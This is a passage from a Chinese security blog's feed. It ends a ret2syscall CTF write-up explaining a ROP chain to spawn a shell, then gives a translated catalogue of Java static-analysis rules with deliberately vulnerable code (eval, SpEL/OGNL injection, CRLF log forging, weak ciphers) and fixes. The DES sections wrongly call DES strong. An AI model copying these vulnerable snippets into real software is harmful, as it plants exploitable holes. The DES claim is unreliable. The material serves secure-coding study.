pop_eax 操作的地址。当 ip 运行到这个地址返回时，就会跳去执行 pop eax 的操作了；同时 esp 在读完这个返回地址后继续往下，指向 0xb 这个数据单元。在 ip 读完 pop eax 指令，就会把当前栈顶的值赋值给 eax，也就是把 0xb 赋值给 eax ，那么我们的第一步目的就达成了。</p><p>然后在栈弹给值 0xb 给 eax 后，栈指针继续往下走指向了 ebx 那一串 pop 指令所在地址，同时ip 会继续走到了执行 ret 的那条指令的位置（ pop eax 后的 ret 操作）。 ret 本质（模糊知识点起作用了）就是把当前栈指向的地址（也就是 ebx 的那一串 pop 指令的地址）返回给 ip 。然后 ip 就会傻傻的跑去执行那一串 pop 操作了，esp也傻傻的继续往下走（指向了payload中的第一个0） 。</p><p>那一串 pop 操作顺序是 pop edx；pop ecx；pop ebx；ret  ，一步一步对应就会是 ：弹出栈顶给 edx（edx被赋值为0）-&gt;  esp继续走（esp指向了第二个0）然后 ip 也继续走去执行 pop ecx  -&gt;  弹出栈顶给 ecx（ecx被赋值为0），然后 ip 也继续走去执行 pop ebx  -&gt; esp继续走 -&gt; 弹出栈顶给 ebx （ ebx 被赋值了 /bin/sh） -&gt; esp继续往下走（指向了 int 0x80）-&gt; ret（弹出栈顶 int 0x80 的值给 ip ，ip跑去执行 int 0x 80h 进入中断）。</p></blockquote><p>至此 rop 链构建成功，成功getshell。</p><p><img src="/2019/12/06/ret2syscall/shell.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>系统调用好用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ret2syscall&quot;&gt;&lt;a href=&quot;#ret2syscall&quot; class=&quot;headerlink&quot; title=&quot;ret2syscall&quot;&gt;&lt;/a&gt;ret2syscall&lt;/h1&gt;&lt;p&gt;大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java审计-DAY3</title>
    <link href="http://bai-ren-1.github.io/2019/12/02/Java%E5%AE%A1%E8%AE%A1-DAY3/"/>
    <id>http://bai-ren-1.github.io/2019/12/02/Java%E5%AE%A1%E8%AE%A1-DAY3/</id>
    <published>2019-12-02T06:56:56.000Z</published>
    <updated>2020-03-06T09:29:32.201Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java审计-DAY3"><a href="#Java审计-DAY3" class="headerlink" title="Java审计-DAY3"></a>Java审计-DAY3</h1><p>转载自 <a href="https://blog.csdn.net/niexinming/article/details/84455035" target="_blank" rel="noopener">https://blog.csdn.net/niexinming/article/details/84455035</a> </p><h1 id="在使用脚本引擎时潜在的代码注入"><a href="#在使用脚本引擎时潜在的代码注入" class="headerlink" title="在使用脚本引擎时潜在的代码注入"></a>在使用脚本引擎时潜在的代码注入</h1><p>漏洞特征：SCRIPT_ENGINE_INJECTION<br>请严格的评估动态代码。应该仔细分析代码的结构。恶意代码的执行会导致数据的泄露或者执行任意系统指令。<br>如果你想动态的运行代码，那么请找一个沙箱（见引用）<br>有害的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public void runCustomTrigger(String script) &#123;</span><br><span class="line">    ScriptEngineManager factory = new ScriptEngineManager();</span><br><span class="line">    ScriptEngine engine = factory.getEngineByName(&quot;JavaScript&quot;);</span><br><span class="line"></span><br><span class="line">    engine.eval(script); //Bad things can happen here.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：<br>使用“Cloudbees Rhino Sandbox”库就能安全的评估Javascript代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public void runCustomTrigger(String script) &#123;</span><br><span class="line">    SandboxContextFactory contextFactory = new SandboxContextFactory();</span><br><span class="line">    Context context = contextFactory.makeContext();</span><br><span class="line">    contextFactory.enterContext(context);</span><br><span class="line">    try &#123;</span><br><span class="line">        ScriptableObject prototype = context.initStandardObjects();</span><br><span class="line">        prototype.setParentScope(null);</span><br><span class="line">        Scriptable scope = context.newObject(prototype);</span><br><span class="line">        scope.setPrototype(prototype);</span><br><span class="line"></span><br><span class="line">        context.evaluateString(scope,script, null, -1, null);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        context.exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://github.com/cloudbees/rhino-sandbox" target="_blank" rel="noopener">Cloudbees Rhino Sandbox: Utility to create sandbox with Rhino (block access to all classes)</a><br><a href="http://codeutopia.net/blog/2009/01/02/sandboxing-rhino-in-java/" target="_blank" rel="noopener">CodeUtopia.net: Sandboxing Rhino in Java</a><br><a href="http://blog.h3xstream.com/2014/11/remote-code-execution-by-design.html" target="_blank" rel="noopener">Remote Code Execution … by design</a>：里面有一些恶意代码的例子。这些例子能测试沙箱的规则<br><a href="http://cwe.mitre.org/data/definitions/94.html" target="_blank" rel="noopener">CWE-94: Improper Control of Generation of Code (‘Code Injection’)</a><br><a href="https://cwe.mitre.org/data/definitions/95.html" target="_blank" rel="noopener">CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (‘Eval Injection’)</a></p><h1 id="使用Spring表达式时潜在的代码注入-SpEL表达式注入）"><a href="#使用Spring表达式时潜在的代码注入-SpEL表达式注入）" class="headerlink" title="使用Spring表达式时潜在的代码注入(SpEL表达式注入）"></a>使用Spring表达式时潜在的代码注入(SpEL表达式注入）</h1><p>漏洞规则：SPEL_INJECTION<br>Spring表达式被用来构建动态的值。源数据应该被严格的检验，以避免未过滤的时候进入到表达式的执行器中<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public void parseExpressionInterface(Person personObj,String property) &#123;</span><br><span class="line"></span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line"></span><br><span class="line">        //Unsafe if the input is control by the user..</span><br><span class="line">        Expression exp = parser.parseExpression(property+&quot; == &apos;Albert&apos;&quot;);</span><br><span class="line"></span><br><span class="line">        StandardEvaluationContext testContext = new StandardEvaluationContext(personObj);</span><br><span class="line">        boolean result = exp.getValue(testContext, Boolean.class);</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/94.html" target="_blank" rel="noopener">CWE-94: Improper Control of Generation of Code (‘Code Injection’)</a><br><a href="http://cwe.mitre.org/data/definitions/95.html" target="_blank" rel="noopener">CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (‘Eval Injection’)</a><br><a href="http://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/html/expressions.html" target="_blank" rel="noopener">Spring Expression Language (SpEL) - Official Documentation</a><br><a href="https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf" target="_blank" rel="noopener">Minded Security: Expression Language Injection</a><br><a href="http://blog.h3xstream.com/2014/11/remote-code-execution-by-design.html" target="_blank" rel="noopener">Remote Code Execution … by design</a>: 里面有一些恶意代码的例子。这些例子能测试沙箱的规则.<br><a href="https://gosecure.net/2018/05/15/beware-of-the-magic-spell-part-1-cve-2018-1273/" target="_blank" rel="noopener">Spring Data-Commons: (CVE-2018-1273)</a><br><a href="http://gosecure.net/2018/05/17/beware-of-the-magic-spell-part-2-cve-2018-1260/" target="_blank" rel="noopener">Spring OAuth2: CVE-2018-1260</a></p><h1 id="使用表达式语言时潜在的代码注入（EL）"><a href="#使用表达式语言时潜在的代码注入（EL）" class="headerlink" title="使用表达式语言时潜在的代码注入（EL）"></a>使用表达式语言时潜在的代码注入（EL）</h1><p>漏洞特征：EL_INJECTION</p><p>表达式语言被用来构建动态的值。源数据应该被严格的检验，以避免未过滤的时候进入到表达式的执行器中<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public void evaluateExpression(String expression) &#123;</span><br><span class="line">    FacesContext context = FacesContext.getCurrentInstance();</span><br><span class="line">    ExpressionFactory expressionFactory = context.getApplication().getExpressionFactory();</span><br><span class="line">    ELContext elContext = context.getELContext();</span><br><span class="line">    ValueExpression vex = expressionFactory.createValueExpression(elContext, expression, String.class);</span><br><span class="line">    return (String) vex.getValue(elContext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://blog.mindedsecurity.com/2015/11/reliable-os-shell-with-el-expression.html" target="_blank" rel="noopener">Minded Security: Abusing EL for executing OS commands</a><br><a href="https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html" target="_blank" rel="noopener">The Java EE 6 Tutorial: Expression Language</a><br><a href="http://cwe.mitre.org/data/definitions/94.html" target="_blank" rel="noopener">CWE-94: Improper Control of Generation of Code (‘Code Injection’)</a><br><a href="http://cwe.mitre.org/data/definitions/95.html" target="_blank" rel="noopener">CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (‘Eval Injection’)</a><br><a href="https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf" target="_blank" rel="noopener">Minded Security: Expression Language Injection</a><br><a href="http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/" target="_blank" rel="noopener">Dan Amodio’s blog: Remote Code with Expression Language Injection</a><br><a href="http://blog.h3xstream.com/2014/11/remote-code-execution-by-design.html" target="_blank" rel="noopener">Remote Code Execution … by design</a>: 里面有一些恶意代码的例子。这些例子能测试沙箱的规则.</p><h1 id="潜在于Seam-logging-call中的代码注入"><a href="#潜在于Seam-logging-call中的代码注入" class="headerlink" title="潜在于Seam logging call中的代码注入"></a>潜在于Seam logging call中的代码注入</h1><p>漏洞特征：SEAM_LOG_INJECTION<br>Seam Logging API支持表达式语言的解析，目的是引出bean的property到日志消息中去。源数据会利用表达式执行未期望的代码。<br>在这个代码片段里面，表达式语言被用来构建动态的值。源数据应该被严格的检验，以避免未过滤的时候进入到表达式的执行器中<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public void logUser(User user) &#123;</span><br><span class="line">    log.info(&quot;Current logged in user : &quot; + user.getUsername());</span><br><span class="line">    //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public void logUser(User user) &#123;</span><br><span class="line">    log.info(&quot;Current logged in user : #0&quot;, user.getUsername());</span><br><span class="line">    //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://issues.jboss.org/browse/JBSEAM-5130" target="_blank" rel="noopener">JBSEAM-5130: Issue documenting the risk</a><br><a href="https://docs.jboss.org/seam/2.3.1.Final/reference/html_single/#d0e4185" target="_blank" rel="noopener">JBoss Seam: Logging (Official documentation)</a><br><a href="https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html" target="_blank" rel="noopener">The Java EE 6 Tutorial: Expression Language</a><br><a href="http://cwe.mitre.org/data/definitions/94.html" target="_blank" rel="noopener">CWE-94: Improper Control of Generation of Code (‘Code Injection’)</a><br><a href="http://cwe.mitre.org/data/definitions/95.html" target="_blank" rel="noopener">CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (‘Eval Injection’)</a></p><h1 id="使用OGNL表达式时潜在的代码注入"><a href="#使用OGNL表达式时潜在的代码注入" class="headerlink" title="使用OGNL表达式时潜在的代码注入"></a>使用OGNL表达式时潜在的代码注入</h1><p>漏洞规则： OGNL_INJECTION<br>表达式语言被用来构建动态的值。源数据应该被严格的检验，以避免未过滤的时候进入到表达式的执行器中<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public void getUserProperty(String property) &#123;</span><br><span class="line">  [...]</span><br><span class="line">  //The first argument is the dynamic expression.</span><br><span class="line">  return ognlUtil.getValue(&quot;user.&quot;+property, ctx, root, String.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案<br>一般，解析OGNL表达式的函数不应该接收用户的输入。它旨在被用于静态配置和jsp。</p><p>引用：<br><a href="https://community.saas.hpe.com/t5/Security-Research/Struts-2-OGNL-Expression-Injections/ba-p/288881" target="_blank" rel="noopener">HP Enterprise: Struts 2 OGNL Expression Injections by Alvaro MuÃ±oz</a><br><a href="https://blog.gdssecurity.com/labs/2017/3/27/an-analysis-of-cve-2017-5638.html" target="_blank" rel="noopener">Gotham Digital Science: An Analysis Of CVE-2017-5638</a><br><a href="http://struts.apache.org/docs/s2-016.html" target="_blank" rel="noopener">Apache Struts2: Vulnerability S2-016</a><br><a href="https://struts.apache.org/docs/ognl.html" target="_blank" rel="noopener">Apache Struts 2 Documentation: OGNL</a></p><h1 id="潜在的http返回报文被分割"><a href="#潜在的http返回报文被分割" class="headerlink" title="潜在的http返回报文被分割"></a>潜在的http返回报文被分割</h1><p>漏洞特征：HTTP_RESPONSE_SPLITTING<br>当http请求包含未期望的CR 和 LF字符的时候，服务器可能会把返回的报文流解析成两个HTTP返回报文（而不是一个）。攻击者可以控制第二个报文并且发动诸如xss攻击或者缓存投毒攻击。按照OWASP的建议，实际上，这个问题现代java EE应用服务器所修复，但还是要严格检验输入。如果你关注这个漏洞，你应该测试你算关心的那个平台，看看这个平台是否允许CR或者 LF被注入到返回报文的头部中。这个漏洞常常被报告为低危，如果你使用有漏洞的平台，请仔细检查低危告警。<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String author = request.getParameter(AUTHOR_PARAMETER);</span><br><span class="line">// ...</span><br><span class="line">Cookie cookie = new Cookie(&quot;author&quot;, author);</span><br><span class="line">response.addCookie(cookie);</span><br></pre></td></tr></table></figure><p>引用:<br><a href="https://www.owasp.org/index.php/HTTP_Response_Splitting" target="_blank" rel="noopener">OWASP: HTTP Response Splitting</a><br><a href="http://cwe.mitre.org/data/definitions/113.html" target="_blank" rel="noopener">CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers (‘HTTP Response Splitting’)</a><br><a href="http://cwe.mitre.org/data/definitions/93.html" target="_blank" rel="noopener">CWE-93: Improper Neutralization of CRLF Sequences (‘CRLF Injection’)</a></p><h1 id="在日志中潜在的CRLF注入"><a href="#在日志中潜在的CRLF注入" class="headerlink" title="在日志中潜在的CRLF注入"></a>在日志中潜在的CRLF注入</h1><p>漏洞规则：CRLF_INJECTION_LOGS<br>当未被信任的输入数据进入到日志中，并且没有正确的做过滤。那么攻击者就可以伪造日志数据或者包含恶意内容。插入恶意的实体通常被用于歪曲统计，分散管理员注意力，或者甚至暗示另一方有恶意行为。如果日志文件被一些自动化的程序自动处理，那么攻击者可以通过破坏文件格式使文件无法使用或者注入一些不被期望的特殊字符。攻击者也可能注入代码或者其他的命令到日志文件中，可能会利用日志处理程序中的漏洞（例如：命令注入或者xss）<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String val = request.getParameter(&quot;user&quot;);</span><br><span class="line">String metadata = request.getParameter(&quot;metadata&quot;);</span><br><span class="line">[...]</span><br><span class="line">if(authenticated) &#123;</span><br><span class="line">    log.info(&quot;User &quot; + val + &quot; (&quot; + metadata + &quot;) was authenticated successfully&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    log.info(&quot;User &quot; + val + &quot; (&quot; + metadata + &quot;) was not authenticated&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意用户可能会发送这样的metadata数据：“Firefox) was authenticated successfully\r\n[INFO] User bbb (Internet Explorer”.</p><p>解决方案：<br>你要手工过滤每一个参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log.info(&quot;User &quot; + val.replaceAll(&quot;[\r\n]&quot;,&quot;&quot;) + &quot; (&quot; + userAgent.replaceAll(&quot;[\r\n]&quot;,&quot;&quot;) + &quot;) was not authenticated&quot;);</span><br></pre></td></tr></table></figure><p>你要配置日志服务器，目的是替换掉所有消息中的\r\n。 OWASP Security Logging已经在Logback 和 Log4j.实现了这个功能。<br>引用：<br><a href="http://cwe.mitre.org/data/definitions/117.html" target="_blank" rel="noopener">CWE-117: Improper Output Neutralization for Logs</a><br><a href="http://cwe.mitre.org/data/definitions/93.html" target="_blank" rel="noopener">CWE-93: Improper Neutralization of CRLF Sequences (‘CRLF Injection’)</a><br><a href="https://logback.qos.ch/manual/layouts.html#replace" target="_blank" rel="noopener">CWE-93: Improper Neutralization of CRLF Sequences (‘CRLF Injection’)</a><br><a href="https://github.com/javabeanz/owasp-security-logging" target="_blank" rel="noopener">OWASP Security Logging</a></p><h1 id="潜在的外部控制配置"><a href="#潜在的外部控制配置" class="headerlink" title="潜在的外部控制配置"></a>潜在的外部控制配置</h1><p>漏洞特征：EXTERNAL_CONFIG_CONTROL<br>允许外部控制系统设置会导致系统的中断或者导致应用行为异常，和潜在的恶意行为。攻击者通过提供不存在的catalog名称可能会导致错误，或者链接到未授权的数据库服务器。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conn.setCatalog(request.getParameter(&quot;catalog&quot;));</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/15.html" target="_blank" rel="noopener">CWE-15: External Control of System or Configuration Setting</a></p><h1 id="坏的十六进制数据"><a href="#坏的十六进制数据" class="headerlink" title="坏的十六进制数据"></a>坏的十六进制数据</h1><p>漏洞特征： BAD_HEXA_CONVERSION<br>当把十六进制字节数组转换为人类可读的字符串的时候，如果数组是被一个字节一个字节读取的话，可能会导致转换错误。下面这个例子是一个很明显的使用 Integer.toHexString() 做转换的例子，它可能会被字节码中的零字节所截断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MessageDigest md = MessageDigest.getInstance(&quot;SHA-256&quot;);</span><br><span class="line">byte[] resultBytes = md.digest(password.getBytes(&quot;UTF-8&quot;));</span><br><span class="line"></span><br><span class="line">StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">for(byte b :resultBytes) &#123;</span><br><span class="line">    stringBuilder.append( Integer.toHexString( b &amp; 0xFF ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return stringBuilder.toString();</span><br></pre></td></tr></table></figure><p>这个错误削弱了hash的计算值，因为它引入了更多的碰撞。比如，用上面的函数计算”0x0679” 和 “0x6709”都会输出679</p><p>在下面的解决方案中，使用String.format()替换toHexString()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stringBuilder.append( String.format( &quot;%02X&quot;, b ) );</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/704.html" target="_blank" rel="noopener">CWE-704: Incorrect Type Conversion or Cast</a></p><h1 id="Hazelcast对称加密"><a href="#Hazelcast对称加密" class="headerlink" title="Hazelcast对称加密"></a>Hazelcast对称加密</h1><p>漏洞规则： HAZELCAST_SYMMETRIC_ENCRYPTION<br>配置Hazelcast让网络通信使用对称加密（可能是DES或者其他的）<br>密码本身不能提供完整性和身份验证。使用非对称加密会更好一些</p><p>引用：<br>[WASC-04: Insufficient Transport Layer Protection](<a href="http://projects.webappsec.org/w/page/13246945/Insufficient" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246945/Insufficient</a> Transport Layer Protection)<br><a href="http://docs.hazelcast.org/docs/3.5/manual/html/encryption.html" target="_blank" rel="noopener">Hazelcast Documentation: Encryption</a><br><a href="http://cwe.mitre.org/data/definitions/326.html" target="_blank" rel="noopener">CWE-326: Inadequate Encryption Strength</a></p><h1 id="不安全的空密码"><a href="#不安全的空密码" class="headerlink" title="不安全的空密码"></a>不安全的空密码</h1><p>漏洞特征： NULL_CIPHER<br>空密码很少被使用在生产环境中。它通过返回与明文相同的密文来实现Cipher接口。在极少的环境中，比如测试环境，才可能会出现空密码<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cipher doNothingCihper = new NullCipher();</span><br><span class="line">[...]</span><br><span class="line">//The ciphertext produced will be identical to the plaintext.</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>解决方案<br>避免使用空密码，意外的使用会导致严重的安全风险。<br>引用：<br><a href="http://cwe.mitre.org/data/definitions/327.html" target="_blank" rel="noopener">CWE-327: Use of a Broken or Risky Cryptographic Algorithm</a></p><p>未加密的socket<br>漏洞特征：UNENCRYPTED_SOCKET<br>如果网络通信不加密的话，那么传输的数据就会被攻击者拦截并读取里面的内容。<br>有漏洞的代码：<br>明文socket（透明传输）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Socket soc = new Socket(&quot;www.google.com&quot;,80);</span><br></pre></td></tr></table></figure><p>解决方案：<br>ssl socket（加密传输）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Socket soc = SSLSocketFactory.getDefault().createSocket(&quot;www.google.com&quot;, 443);</span><br></pre></td></tr></table></figure><p>使用sslsocket，你需要确保你使用的SSLSocketFactory能验证所提供的证书是否有效，这样你就不会遭受中间人攻击。请阅读owasp中关于传输层协议的那一章，以了解更多正确的做法。</p><p>引用：<br><a href="https://www.owasp.org/index.php/Top_10_2010-A9" target="_blank" rel="noopener">OWASP: Top 10 2010-A9-Insufficient Transport Layer Protection</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure" target="_blank" rel="noopener">OWASP: Top 10 2013-A6-Sensitive Data Exposure</a><br><a href="https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Transport Layer Protection Cheat Sheet</a><br>[WASC-04: Insufficient Transport Layer Protection](<a href="http://projects.webappsec.org/w/page/13246945/Insufficient" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246945/Insufficient</a> Transport Layer Protection)<br><a href="http://cwe.mitre.org/data/definitions/319.html" target="_blank" rel="noopener">CWE-319: Cleartext Transmission of Sensitive Information</a></p><h1 id="未加密的服务器socket"><a href="#未加密的服务器socket" class="headerlink" title="未加密的服务器socket"></a>未加密的服务器socket</h1><p>漏洞特征：UNENCRYPTED_SERVER_SOCKET</p><p>如果网络通信不加密的话，那么传输的数据就会被攻击者拦截并读取里面的内容。<br>有漏洞的代码：<br>明文socket（透明传输）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerSocket soc = new ServerSocket(1234);</span><br></pre></td></tr></table></figure><p>解决方案：<br>ssl socket（加密传输）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerSocket soc = SSLServerSocketFactory.getDefault().createServerSocket(1234);</span><br></pre></td></tr></table></figure><p>使用sslsocket，你需要确保你使用的SSLSocketFactory能验证所提供的证书是否有效，这样你就不会遭受中间人攻击。请阅读owasp中关于传输层协议的那一章，以了解更多正确的做法。</p><p>引用：<br><a href="https://www.owasp.org/index.php/Top_10_2010-A9" target="_blank" rel="noopener">OWASP: Top 10 2010-A9-Insufficient Transport Layer Protection</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure" target="_blank" rel="noopener">OWASP: Top 10 2013-A6-Sensitive Data Exposure</a><br><a href="https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Transport Layer Protection Cheat Sheet</a><br>[WASC-04: Insufficient Transport Layer Protection](<a href="http://projects.webappsec.org/w/page/13246945/Insufficient" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246945/Insufficient</a> Transport Layer Protection)<br><a href="http://cwe.mitre.org/data/definitions/319.html" target="_blank" rel="noopener">CWE-319: Cleartext Transmission of Sensitive Information</a></p><h1 id="DES是不安全的"><a href="#DES是不安全的" class="headerlink" title="DES是不安全的"></a>DES是不安全的</h1><p>漏洞特征：DES_USAGE</p><p>DES被认为是现代加密系统中比较强壮的加密方式，当前，NIST建议使用AES block ciphers来替代DES<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;DES/ECB/PKCS5Padding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>解决方案示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://www.nist.gov/itl/fips/060205_des.cfm" target="_blank" rel="noopener">NIST Withdraws Outdated Data Encryption Standard</a><br><a href="http://cwe.mitre.org/data/definitions/326.html" target="_blank" rel="noopener">CWE-326: Inadequate Encryption Strength</a></p><h1 id="DESede是不安全的"><a href="#DESede是不安全的" class="headerlink" title="DESede是不安全的"></a>DESede是不安全的</h1><p>漏洞特征:TDES_USAGE</p><p>三次DES（也被称为3DES 或者 DESede）被认为是现代加密系统中比较强壮的加密方式，当前，NIST建议使用AES block ciphers来替代DES<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;DESede/ECB/PKCS5Padding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>解决方案示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://www.nist.gov/itl/fips/060205_des.cfm" target="_blank" rel="noopener">NIST Withdraws Outdated Data Encryption Standard</a><br><a href="http://cwe.mitre.org/data/definitions/326.html" target="_blank" rel="noopener">CWE-326: Inadequate Encryption Strength</a></p><h1 id="不用padding的RSA是不安全的"><a href="#不用padding的RSA是不安全的" class="headerlink" title="不用padding的RSA是不安全的"></a>不用padding的RSA是不安全的</h1><p>漏洞特征：RSA_NO_PADDING</p><p>软件使用RSA加密算法但是没有使用非对称加密填充(OAEP), 这种加密可能会是比较脆弱的<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cipher.getInstance(&quot;RSA/NONE/NoPadding&quot;)</span><br></pre></td></tr></table></figure><p>解决方案：<br>应该用下面的代码来替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cipher.getInstance(&quot;RSA/ECB/OAEPWithMD5AndMGF1Padding&quot;)</span><br></pre></td></tr></table></figure><p>引用:<br><a href="http://cwe.mitre.org/data/definitions/780.html" target="_blank" rel="noopener">CWE-780: Use of RSA 